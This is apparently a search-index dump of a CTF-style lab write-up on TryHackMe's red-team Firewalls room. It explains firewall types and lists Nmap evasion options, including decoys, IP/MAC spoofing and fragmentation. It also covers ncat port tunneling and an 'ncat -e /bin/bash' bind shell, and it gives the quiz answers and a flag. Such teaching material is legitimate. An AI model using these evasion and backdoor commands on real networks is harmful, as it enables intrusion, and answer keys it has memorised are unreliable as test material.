Arena"},{"location":"tryhackme/room/l/redteamfirewalls/","text":"Firewalls \u00b6 Task 1 Introduction \u00b6 A firewall is software or hardware that monitors the network traffic and compares it against a set of rules before passing or blocking it. One simple analogy is a guard or gatekeeper at the entrance of an event. This gatekeeper can check the ID of individuals against a set of rules before letting them enter (or leave). Before we go into more details about firewalls, it is helpful to remember the contents of an IP packet and TCP segment. The following figure shows the fields we expect to find in an IP header. If the figure below looks complicated, you don\u2019t need to worry as we are only interested in a few fields. Different types of firewalls are capable of inspecting various packet fields; however, the most basic firewall should be able to inspect at least the following fields: Protocol Source Address Destination Address Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are: TCP UDP ICMP In the case of TCP or UDP, the firewall should at least be able to check the TCP and UDP headers for: Source Port Number Destination Port Number The TCP header is shown in the figure below. We notice that there are many fields that the firewall might or might not be able to analyze; however, even the most limited of firewalls should give the firewall administrator control over allowed or blocked source and destination port numbers. Learning Objectives \u00b6 This room covers: The different types of firewalls, according to different classification criteria Various techniques to evade firewalls This room requires the user to have basic knowledge of: ISO/OSI layers and TCP/IP layers. We suggest going through the Network Fundamentals module if you want to refresh your knowledge. Network and port scanning. We suggest you complete the Nmap module to learn more about this topic. Reverse and bind shells. We recommend the What the Shell ? room to learn more about shells. Warmup Questions \u00b6 The design logic of traditional firewalls is that a port number would identify the service and the protocol. In traditional firewalls, i.e., packet-filtering firewalls, everything is allowed and blocked mainly based on the following: Protocol, such as TCP, UDP, and ICMP IP source address IP destination address Source TCP or UDP port number Destination TCP or UDP port number Let\u2019s consider this very simplified example. If you want to block HTTP traffic, you need to block the TCP traffic from source TCP port 80, i.e., the port number used by HTTP by default. If you want to allow HTTPS traffic, you should allow the traffic from source TCP port number 443, i.e., the port number used by HTTPS. Obviously, this is not efficient because there are other default port numbers that we need to include. Furthermore, the service can be running on a non-default port number. Someone can run an HTTP server on port 53 or 6667. Visit Service Name and Transport Protocol Port Number Registry to learn more about the default port number and to answer the following questions. Answer the questions bellow Question: If you want to block telnet, which TCP port number would you deny? Ans: 23 Question: You want to allow HTTPS, which TCP port number do you need to permit? Ans: 443 Question: What is an alternate TCP port number used for HTTP? It is described as \u201cHTTP Alternate.\u201d Ans: 8080 Question: You need to allow SNMP over SSH, snmpssh. Which port should be permitted? Ans: 5161 https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=snmp Task 2: Types of Firewalls \u00b6 There are multiple ways to classify firewalls. One way to classify firewalls would be whether they are independent appliances. Hardware Firewall (appliance firewall): As the name implies, an appliance firewall is a separate piece of hardware that the network traffic has to go through. Examples include Cisco ASA (Adaptive Security Appliance), WatchGuard Firebox, and Netgate pfSense Plus appliance. Software firewall: This is a piece of software that comes bundled with the OS, or you can install it as an additional service. MS Windows has a built-in firewall, Windows Defender Firewall, that runs along with the other OS services and user applications. Another example is Linux iptables and firewalld. We can also classify firewalls into: Personal firewall: A personal firewall is designed to protect a single system or a small network, for example, a small number of devices and systems at a home network. Most likely, you are using a personal firewall at home without paying much attention to it. For instance, many wireless access points designed for homes have a built-in firewall. One example is Bitdefender BOX. Another example is the firewall that comes as part of many wireless access points and home routers from Linksys and Dlink. Commercial firewall: A commercial firewall protects medium-to-large networks. Consequently, you would expect higher reliability and processing power, in addition to supporting a higher network bandwidth. Most likely, you are going through such a firewall when accessing the Internet from within your university or company. From the red team perspective, the most crucial classification would be based on the firewall inspection abilities. It is worth thinking about the firewall abilities in terms of the ISO/OSI layers shown in the figure below. Before we classify firewalls based on their abilities, it is worthy of remembering that firewalls focus on layers 3 and 4 and, to a lesser extent, layer 2. Next-generation firewalls are also designed to cover layers 5, 6, and 7. The more layers a firewall can inspect, the more sophisticated it gets and the more processing power it needs. Based on firewall abilities, we can list the following firewall types: Packet-Filtering Firewall: Packet-filtering is the most basic type of firewall. This type of firewall inspects the protocol, source and destination IP addresses, and source and destination ports in the case of TCP and UDP datagrams. It is a stateless inspection firewall. Circuit-Level Gateway: In addition to the features offered by the packet-filtering firewalls, circuit-level gateways can provide additional capabilities, such as checking TCP three-way-handshake against the firewall rules. Stateful Inspection Firewall: Compared to the previous types, this type of firewall gives an additional layer of protection as it keeps track of the established TCP sessions. As a result, it can detect and block any TCP packet outside an established TCP session. Proxy Firewall: A proxy firewall is also referred to as Application Firewall (AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols. Next-Generation Firewall (NGFW): NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has application awareness and control. Examples include the Juniper SRX series and Cisco Firepower. Cloud Firewall or Firewall as a Service (FWaaS): FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare Magic Firewall, which is a network-level firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud. It is also worth mentioning AWS WAF for web application protection and AWS Shield for DDoS protection. Answer the questions bellow Question: What is the most basic type of firewall? Ans: Packet-Filtering Firewall Question: What is the most advanced type of firewall that you can have on company premises? Ans: Next-Generation Firewall Task 3: Evasion via Controlling the Source MAC/IP/Port \u00b6 When scanning a host behind a firewall, the firewall will usually detect and block port scans. This situation would require you to adapt your network and port scan to evade the firewall. A network scanner like Nmap provides few features to help with such a task. In this room, we group Nmap techniques into three groups: Evasion via controlling the source MAC/IP/Port Evasion via fragmentation, MTU, and data length Evasion through modifying header fields Nmap allows you to hide or spoof the source as you can use: Decoy(s) Proxy Spoofed MAC Address Spoofed Source IP Address Fixed Source Port Number Before we elaborate on each approach, let\u2019s show what a Nmap stealth (SYN) scan looks like. We are scanning an MS Windows target (with default built-in firewall), so we added -Pn to force the scan to proceed even if no ping reply is received. -Pn is used to skip host discovery and testing whether the host is live. Moreover, to speed up the scan, we limited ourselves to the 100 most common ports using the -F option. The scan was performed using the following command nmap -sS -Pn -F MACHINE_IP . The following screenshot shows Wireshark\u2019s capture of the Nmap probe packets. Wireshark was running on the same system running Nmap. We can dive into all the details embedded into each packet; however, for this exercise, we would like to note the following: Our IP address 10.14.17.226 has generated and sent around 200 packets. The -F option limits the scan to the top 100 common ports; moreover, each port is sent a second SYN packet if it does not reply to the first one. The source port number is chosen at random. In the screenshot, you can see it is 37710. The total length of the IP packet is 44 bytes. There are 20 bytes for the IP header, which leaves 24 bytes for the TCP header. No data is sent via TCP. The Time to Live (TTL) is 42. No errors are introduced in the checksum. In the following sections and tasks, we will see how Nmap provides various options to evade the firewall and other network security solutions. Answer the questions bellow Question: What is the size of the IP packet when using a default Nmap stealth (SYN) scan? Ans: 44 Question: How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan? Ans: 0 Question: Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -F MACHINE_IP ? Approximate to the nearest 100, such as 100, 200, 300, etc. Ans: 200 Decoy(s) \u00b6 Hide your scan with decoys. Using decoys makes your IP address mix with other \u201cdecoy\u201d IP addresses. Consequently, it will be difficult for the firewall and target host to know where the port scan is coming from. Moreover, this can exhaust the blue team investigating each source IP address. Using the -D option, you can add decoy source IP addresses to confuse the target. Consider the following command, nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP . The Wireshark capture is shown in the following figure. The target MACHINE_IP will also see scans coming from 10.10.10.1 and 10.10.10.2 when only one source IP address, ME, is running the scan. Note that if you omit the ME entry in the scan command, Nmap will put your real IP address, i.e. ME, in a random position. You can also set Nmap to use random source IP addresses instead of explicitly specifying them. By running nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP , Nmap will choose two random source IP addresses to use as decoys. Nmap will use new random IP addresses each time you run this command. In the screenshot below, we see how Nmap picked two random IP addresses in addition to our own, 10.14.17.226 . Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP ? Approximate to the nearest 100, such as 100, 200, 300, etc. Ans: 800 Proxy \u00b6 Use an HTTP/SOCKS4 proxy. Relaying the port scan via a proxy helps keep your IP address unknown to the target host. This technique allows you to keep your IP address hidden while the target logs the IP address of the proxy server. You can go this route using the Nmap option --proxies PROXY_URL . For example, nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP will send all its packets via the proxy server you specify. Note that you can chain proxies using a comma-separated list. What do you expect the target to see as the source of the scan when you run the command nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP Ans: 10.10.13.37 Spoofed MAC Address \u00b6 Spoof the source MAC address. Nmap allows you to spoof your MAC address using the option --spoof-mac MAC_ADDRESS . This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing the same Ethernet, you won\u2019t be able to capture and read the responses. It allows you to exploit any trust relationship based on MAC addresses. Moreover, you can use this technique to hide your scanning activities on the network. For example, you can make your scans appear as if coming from a network printer. What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, 00:02:DC ? Ans: Fujitsu General Ltd Visit https://maclookup.app/macaddress/0002DC/mac-address-details Spoofed IP Address \u00b6 Spoof the source IP address. Nmap lets you spoof your IP address using -S IP_ADDRESS . Spoofing the IP address is useful if your system is on the same subnetwork as the target host; otherwise, you won\u2019t be able to read the replies sent back. The reason is that the target host will reply to the spoofed IP address, and unless you can capture the responses, you won\u2019t benefit from this technique. Another use for spoofing your IP address is when you control the system that has that particular IP address. Consequently, if you notice that the target started to block the spoofed IP address, you can switch to a different spoofed IP address that belongs to a system that you also control. This scanning technique can help you maintain stealthy existence; moreover, you can use this technique to exploit trust relationships on the network based on IP addresses. To mislead the opponent, you decided to make your port scans appear as if coming from a local access point that has the IP address 10.10.0.254 . What option needs to be added to your Nmap command to spoof your address accordingly? Ans: -S 10.10.0.254 Fixed Source Port Number \u00b6 Use a specific source port number. Scanning from one particular source port number can be helpful if you discover that the firewalls allow incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries. You can set your port number using -g or --source-port options. The following Wireshark screenshot shows a Nmap scan with the fixed source TCP port number 8080. We have used the following Nmap command, nmap -sS -Pn -g 8080 -F MACHINE_IP . You can see in the screenshot how it is that all the TCP connections are sent from the same TCP port number. You decide to use Nmap to scan for open UDP ports. You notice that using nmap -sU -F MACHINE_IP to discover the open common UDP ports won\u2019t give you any meaningful results. What do you need to add to your Nmap command to set the source port number to 53? Ans: -g 53 This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Hide a scan with decoys -D DECOY1_IP1,DECOY_IP2,ME Hide a scan with random decoys -D RND,RND,ME Use an HTTP/SOCKS4 proxy to relay connections --proxies PROXY_URL Spoof source MAC address --spoof-mac MAC_ADDRESS Spoof source IP address -S IP_ADDRESS Use a specific source port number -g PORT_NUM or --source-port PORT_NUM Task 4: Evasion via Forcing Fragmentation, MTU, and Data Length \u00b6 You can control the packet size as it allows you to: Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it. Send packets with specific data lengths. Answer the questions bellow Fragment Your Packets with 8 Bytes of Data \u00b6 One easy way to fragment your packets would be to use the -f option. This option will fragment the IP packet to carry only 8 bytes of data. As mentioned earlier, running a Nmap TCP port scan means that the IP packet will hold 24 bytes, the TCP header. If you want to limit the IP data to 8 bytes, the 24 bytes of the TCP header will be divided across 3 IP packets. And this is precisely what we obtained when we ran this Nmap scan, nmap -sS -Pn -f -F MACHINE_IP . As we can see in the Wireshark capture in the figure below, each IP packet is fragmented into three packets, each with 8 bytes of data. What is the size of the IP packet when running Nmap with the -f option? Ans: 28 Fragment Your Packets with 16 Bytes of Data \u00b6 Another handy option is the -ff , limiting the IP data to 16 bytes. (One easy way to remember this is that one f is 8 bytes, but two f s are 16 bytes.) By running nmap -sS -Pn -ff -F MACHINE_IP , we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, because -ff has put an upper limit of 16 bytes. The first few packets are shown in the Wireshark capture below. What is the maximum size of the IP packet when running Nmap with the -ff option? Ans: 36 Fragment Your Packets According to a Set MTU \u00b6 Another neat way to fragment your packets is by setting the MTU. In Nmap, --mtu VALUE specifies the number of bytes per IP packet. In other words, the IP header size is not included. The value set for MTU must always be a multiple of 8. Note that the Maximum Transmission Unit (MTU) indicates the maximum packet size that can pass on a certain link-layer connection. For instance, Ethernet has an MTU of 1500, meaning that the largest IP packet that can be sent over an Ethernet (link layer) connection is 1500 bytes. Please don\u2019t confuse this MTU with the --mtu in Nmap options. Running Nmap with --mtu 8 will be identical to -f as the IP data will be limited to 8 bytes. The first few packets generated by this Nmap scan nmap -sS -Pn --mtu 8 -F MACHINE_IP are shown in the following Wireshark capture. What is the maximum size of the IP packet when running Nmap with --mtu 36 option? Ans: 56 Generate Packets with Specific Length \u00b6 In some instances, you might find out that the size of the packets is triggering the firewall or the IDS/IPS to detect and block you. If you ever find yourself in such a situation, you can make your port scanning more evasive by setting a specific length. You can set the length of data carried within the IP packet using --data-length VALUE . Again, remember that the length should be a multiple of 8. If you run the following Nmap scan nmap -sS -Pn --data-length 64 -F MACHINE_IP , each TCP segment will be padded with random data till its length is 64 bytes. In the screenshot below, we can see that each TCP segment has a length of 64 bytes. What is the maximum size of the IP packet when running Nmap with --data-length 128 option? Ans: 148 This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Fragment packets with given MTU --mtu VALUE Specify packet length --data-length NUM Task 5: Evasion via Modifying Header Fields \u00b6 Nmap allows you to control various header fields that might help evade the firewall. You can: Set IP time-to-live Send packets with specified IP options Send packets with a wrong TCP/UDP checksum Set TTL \u00b6 Nmap gives you further control over the different fields in the IP header. One of the fields you can control is the Time-to-Live (TTL). Nmap options include --ttl VALUE to set the TTL to a custom value. This option might be useful if you think the default TTL exposes your port scan activities. In the following screenshot, we can see the packets captured by Wireshark after using a custom TTL as we run our scan, nmap -sS -Pn --ttl 81 -F MACHINE_IP . As with the previous examples, the packets below are captured on the same system running Nmap. Answer the questions bellow Start the AttackBox and the machine attached to this task. After you give them time to load fully, scan the attached MS Windows machine using --ttl 1 option. Check the number of ports that appear to be open. The answer will vary depending on whether you are using the AttackBox or connecting over VPN. We suggest you try both. Question: Scan the attached MS Windows machine using --ttl 2 option. How many ports appear to be open? Ans: 3 Set IP Options \u00b6 One of the IP header fields is the IP Options field. Nmap lets you control the value set in the IP Options field using --ip-options HEX_STRING, where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written as \\xHH, where HH represents two hexadecimal digits, i.e., one byte. A shortcut provided by Nmap is using the letters to make your requests: R to record-route. T to record-timestamp. U to record-route and record-timestamp. L for loose source routing and needs to be followed by a list of IP addresses separated by space. S for strict source routing and needs to be followed by a list of IP addresses separated by space. The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system. Use a Wrong Checksum \u00b6 Another trick you can use is to send your packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others won\u2019t. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the option --badsum to your Nmap command. Using nmap -sS -Pn --badsum -F MACHINE_IP , we scanned our target using intentionally incorrect TCP checksums. The target dropped all our packets and didn\u2019t respond to any of them. Pentester Terminal pentester @TryHackMe # nmap -sS -Pn --badsum -F MACHINE_IP Host discovery disabled ( -Pn ). All addresses will be marked 'up' and scan times will be slower . Starting Nmap 7 . 91 ( https :// nmap . org ) at 2022 - 01 - 28 16 : 07 EET Nmap scan report for MACHINE_IP Host is up . All 100 scanned ports on MACHINE_IP are filtered Nmap done : 1 IP address ( 1 host up ) scanned in 21 . 31 seconds The screenshot below shows the packets captured by Wireshark on the system running Nmap. Wireshark can be optionally set to verify the checksums, and we can notice how it highlights the errors. Question: Scan the attached MS Windows machine using the --badsum option. How many ports appear to be open? Ans: 0 Alt text This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Set IP time-to-live field --ttl VALUE Send packets with specified IP options --ip-options OPTIONS Send packets with a wrong TCP/UDP checksum --badsum Task 6: Evasion Using Port Hopping \u00b6 Three common firewall evasion techniques are: Port hopping Port tunneling Use of non-standard ports Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some \u201clegitimate\u201d applications use this technique to evade firewalls. In the following figure, the client kept trying different ports to reach the server till it discovered a destination port not blocked by the firewall. There is another type of port hopping where the application establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on (i.e., hopping to) a different port and resumes sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic. On the AttackBox, you can use the command ncat -lvnp PORT_NUMBER to listen on a certain TCP port. -l listens for incoming connections -v provides verbose details (optional) -n does not resolve hostnames via DNS (optional) -p specifies the port number to use -lvnp PORT_NUMBER listens on TCP port PORT_NUMBER . If the port number is less than 1024, you need to run ncat as root. For example, run ncat -lvnp 1025 on the AttackBox to listen on TCP port 1025, as shown in the terminal output below. Pentester Terminal pentester @TryHackMe $ ncat -lvnp 1025 Ncat : Version 7 . 91 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 1025 Ncat : Listening on 0 . 0 . 0 . 0 : 1025 We want to test if the target machine can connect to the AttackBox on TCP port 1025. By browsing to http://MACHINE_IP:8080 , you will be faced with a web page that lets you execute commands on the target machine. Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice. In this lab, you can simply run a Linux command by submitting it on the provided form at http://MACHINE_IP:8080 . We can use Netcat to connect to the target port using the command ncat IP_ADDRSS PORT_NUMBER . For instance, we can run ncat ATTACKBOX_IP 1024 to connect to the AttackBox at TCP port 1024. We want to check if the firewall is configured to allow connections. If the connection from the machine, with IP address MACHINE_IP , can pass through the firewall, we will be notified of the successful connection on the AttackBox terminal as shown below. Pentester Terminal pentester @TryHackMe $ ncat -lvnp 1025 Ncat : Version 7 . 91 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 1025 Ncat : Listening on 0 . 0 . 0 . 0 : 1025 Ncat : Connection from 10 . 10 . 30 . 130 . Ncat : Connection from 10 . 10 . 30 . 130 : 51292 . Answer the questions bellow Using this simple technique, discover which port number of the following destination TCP port numbers are reachable from the protected system. - 21 - 23 - 25 - 26 - 27 Ans: 21 Task 7: Evasion Using Port Tunneling \u00b6 Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system. Port Tunneling Using ncat \u00b6 Consider the case where you have a server behind the firewall that you cannot access from the outside. However, you discovered that the firewall does not block specific port(s). You can use this knowledge to your advantage by tunneling the traffic via a different port. Consider the following case. We have an SMTP server listening on port 25; however, we cannot connect to the SMTP server because the firewall blocks packets from the Internet sent to destination port 25. We discover that packets sent to destination port 443 are not blocked, so we decide to take advantage of this and send our packets to port 443, and after they pass through the firewall, we forward them to port 25. Let\u2019s say that we can run a command of our choice on one of the systems behind the firewall. We can use that system to forward our packets to the SMTP server using the following command. ncat -lvnp 443 -c \"ncat TARGET_SERVER 25\" The command ncat uses the following options: -lvnp 443 listens on TCP port 443. Because the port number is less than 1024, you need to run ncat as root in this case. -c or --sh-exec executes the given command via /bin/sh . \"ncat TARGET_SERVER 25\" will connect to the target server at port 25. As a result, ncat will listen on port 443, but it will forward all packets to port 25 on the target server. Because in this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall. Answer the questions bellow We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We\u2019re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag. Ans: THM{1298331956} Task 8: Evasion Using Non-Standard Ports \u00b6 ncat -lvnp PORT_NUMBER -e /bin/bash will create a backdoor via the specified port number that lets you interact with the Bash shell. -e or --exec executes the given command /bin/bash location of the command we want to execute On the AttackBox, we can run ncat MACHINE_IP PORT_NUMBER to connect to the target machine and interact with its shell. Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root , or using sudo , we cannot use port numbers below 1024. Answer the questions bellow We\u2019re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in? Ans: thmredteam Task 9: Next-Generation Firewalls \u00b6 Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS. Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include: Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time. Identify users and their traffic. It can enforce the security policy per-user or per-group basis. Identify the applications and protocols regardless of the port number being used. Identify the content being transmitted. It can enforce the security policy in case any violating content is detected. Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files. A properly configured and deployed NGFW renders many attacks useless. Answer the questions bellow What is the number of the highest OSI layer that an NGFW can process? Ans: 7 Task 10: Conclusion \u00b6 This room covered the different types of firewalls and the common evasion techniques. Correctly understanding the limitations of the firewall technology you are targeting helps you pick and construct suitable firewall evasion processes. This room demonstrated different evasion techniques using ncat ; however, the same results can be achieved using a different tool, such as socat . It is recommended to check out the What the Shell ? room. The following table summarizes the Nmap arguments covered in this room. Evasion Approach Nmap Argument Hide a scan with decoys -D DECOY1_IP1,DECOY_IP2,ME Use an HTTP/SOCKS4 proxy to relay connections --proxies PROXY_URL Spoof source MAC address --spoof-mac MAC_ADDRESS Spoof source IP address -S IP_ADDRESS Use a specific source port number -g PORT_NUM or --source-port PORT_NUM Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Fragment packets with given MTU --mtu VALUE Specify packet length --data-length NUM Set IP time-to-live field --ttl VALUE Send packets with specified IP options --ip-options OPTIONS Send packets with a wrong TCP/UDP checksum --badsum","title":"Firewalls"},{"location":"tryhackme/room/l/redteamfirewalls/#firewalls","text":"","title":"Firewalls"},{"location":"tryhackme/room/l/redteamfirewalls/#task-1-introduction","text":"A firewall is software or hardware that monitors the network traffic and compares it against a set of rules before passing or blocking it. One simple analogy is a guard or gatekeeper at the entrance of an event. This gatekeeper can check the ID of individuals against a set of rules before letting them enter (or leave). Before we go into more details about firewalls, it is helpful to remember the contents of an IP packet and TCP segment. The following figure shows the fields we expect to find in an IP header. If the figure below looks complicated, you don\u2019t need to worry as we are only interested in a few fields. Different types of firewalls are capable of inspecting various packet fields; however, the most basic firewall should be able to inspect at least the following fields: Protocol Source Address Destination Address Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are: TCP UDP ICMP In the case of TCP or UDP, the firewall should at least be able to check the TCP and UDP headers for: Source Port Number Destination Port Number The TCP header is shown in the figure below. We notice that there are many fields that the firewall might or might not be able to analyze; however, even the most limited of firewalls should give the firewall administrator control over allowed or blocked source and destination port numbers.","title":"Task 1  Introduction"},{"location":"tryhackme/room/l/redteamfirewalls/#learning-objectives","text":"This room covers: The different types of firewalls, according to different classification criteria Various techniques to evade firewalls This room requires the user to have basic knowledge of: ISO/OSI layers and TCP/IP layers. We suggest going through the Network Fundamentals module if you want to refresh your knowledge. Network and port scanning. We suggest you complete the Nmap module to learn more about this topic. Reverse and bind shells. We recommend the What the Shell ? room to learn more about shells.","title":"Learning Objectives"},{"location":"tryhackme/room/l/redteamfirewalls/#warmup-questions","text":"The design logic of traditional firewalls is that a port number would identify the service and the protocol. In traditional firewalls, i.e., packet-filtering firewalls, everything is allowed and blocked mainly based on the following: Protocol, such as TCP, UDP, and ICMP IP source address IP destination address Source TCP or UDP port number Destination TCP or UDP port number Let\u2019s consider this very simplified example. If you want to block HTTP traffic, you need to block the TCP traffic from source TCP port 80, i.e., the port number used by HTTP by default. If you want to allow HTTPS traffic, you should allow the traffic from source TCP port number 443, i.e., the port number used by HTTPS. Obviously, this is not efficient because there are other default port numbers that we need to include. Furthermore, the service can be running on a non-default port number. Someone can run an HTTP server on port 53 or 6667. Visit Service Name and Transport Protocol Port Number Registry to learn more about the default port number and to answer the following questions. Answer the questions bellow Question: If you want to block telnet, which TCP port number would you deny? Ans: 23 Question: You want to allow HTTPS, which TCP port number do you need to permit? Ans: 443 Question: What is an alternate TCP port number used for HTTP? It is described as \u201cHTTP Alternate.\u201d Ans: 8080 Question: You need to allow SNMP over SSH, snmpssh. Which port should be permitted? Ans: 5161 https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=snmp","title":"Warmup Questions"},{"location":"tryhackme/room/l/redteamfirewalls/#task-2-types-of-firewalls","text":"There are multiple ways to classify firewalls. One way to classify firewalls would be whether they are independent appliances. Hardware Firewall (appliance firewall): As the name implies, an appliance firewall is a separate piece of hardware that the network traffic has to go through. Examples include Cisco ASA (Adaptive Security Appliance), WatchGuard Firebox, and Netgate pfSense Plus appliance. Software firewall: This is a piece of software that comes bundled with the OS, or you can install it as an additional service. MS Windows has a built-in firewall, Windows Defender Firewall, that runs along with the other OS services and user applications. Another example is Linux iptables and firewalld. We can also classify firewalls into: Personal firewall: A personal firewall is designed to protect a single system or a small network, for example, a small number of devices and systems at a home network. Most likely, you are using a personal firewall at home without paying much attention to it. For instance, many wireless access points designed for homes have a built-in firewall. One example is Bitdefender BOX. Another example is the firewall that comes as part of many wireless access points and home routers from Linksys and Dlink. Commercial firewall: A commercial firewall protects medium-to-large networks. Consequently, you would expect higher reliability and processing power, in addition to supporting a higher network bandwidth. Most likely, you are going through such a firewall when accessing the Internet from within your university or company. From the red team perspective, the most crucial classification would be based on the firewall inspection abilities. It is worth thinking about the firewall abilities in terms of the ISO/OSI layers shown in the figure below. Before we classify firewalls based on their abilities, it is worthy of remembering that firewalls focus on layers 3 and 4 and, to a lesser extent, layer 2. Next-generation firewalls are also designed to cover layers 5, 6, and 7. The more layers a firewall can inspect, the more sophisticated it gets and the more processing power it needs. Based on firewall abilities, we can list the following firewall types: Packet-Filtering Firewall: Packet-filtering is the most basic type of firewall. This type of firewall inspects the protocol, source and destination IP addresses, and source and destination ports in the case of TCP and UDP datagrams. It is a stateless inspection firewall. Circuit-Level Gateway: In addition to the features offered by the packet-filtering firewalls, circuit-level gateways can provide additional capabilities, such as checking TCP three-way-handshake against the firewall rules. Stateful Inspection Firewall: Compared to the previous types, this type of firewall gives an additional layer of protection as it keeps track of the established TCP sessions. As a result, it can detect and block any TCP packet outside an established TCP session. Proxy Firewall: A proxy firewall is also referred to as Application Firewall (AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols. Next-Generation Firewall (NGFW): NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has application awareness and control. Examples include the Juniper SRX series and Cisco Firepower. Cloud Firewall or Firewall as a Service (FWaaS): FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare Magic Firewall, which is a network-level firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud. It is also worth mentioning AWS WAF for web application protection and AWS Shield for DDoS protection. Answer the questions bellow Question: What is the most basic type of firewall? Ans: Packet-Filtering Firewall Question: What is the most advanced type of firewall that you can have on company premises? Ans: Next-Generation Firewall","title":"Task 2: Types of Firewalls"},{"location":"tryhackme/room/l/redteamfirewalls/#task-3-evasion-via-controlling-the-source-macipport","text":"When scanning a host behind a firewall, the firewall will usually detect and block port scans. This situation would require you to adapt your network and port scan to evade the firewall. A network scanner like Nmap provides few features to help with such a task. In this room, we group Nmap techniques into three groups: Evasion via controlling the source MAC/IP/Port Evasion via fragmentation, MTU, and data length Evasion through modifying header fields Nmap allows you to hide or spoof the source as you can use: Decoy(s) Proxy Spoofed MAC Address Spoofed Source IP Address Fixed Source Port Number Before we elaborate on each approach, let\u2019s show what a Nmap stealth (SYN) scan looks like. We are scanning an MS Windows target (with default built-in firewall), so we added -Pn to force the scan to proceed even if no ping reply is received. -Pn is used to skip host discovery and testing whether the host is live. Moreover, to speed up the scan, we limited ourselves to the 100 most common ports using the -F option. The scan was performed using the following command nmap -sS -Pn -F MACHINE_IP . The following screenshot shows Wireshark\u2019s capture of the Nmap probe packets. Wireshark was running on the same system running Nmap. We can dive into all the details embedded into each packet; however, for this exercise, we would like to note the following: Our IP address 10.14.17.226 has generated and sent around 200 packets. The -F option limits the scan to the top 100 common ports; moreover, each port is sent a second SYN packet if it does not reply to the first one. The source port number is chosen at random. In the screenshot, you can see it is 37710. The total length of the IP packet is 44 bytes. There are 20 bytes for the IP header, which leaves 24 bytes for the TCP header. No data is sent via TCP. The Time to Live (TTL) is 42. No errors are introduced in the checksum. In the following sections and tasks, we will see how Nmap provides various options to evade the firewall and other network security solutions. Answer the questions bellow Question: What is the size of the IP packet when using a default Nmap stealth (SYN) scan? Ans: 44 Question: How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan? Ans: 0 Question: Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -F 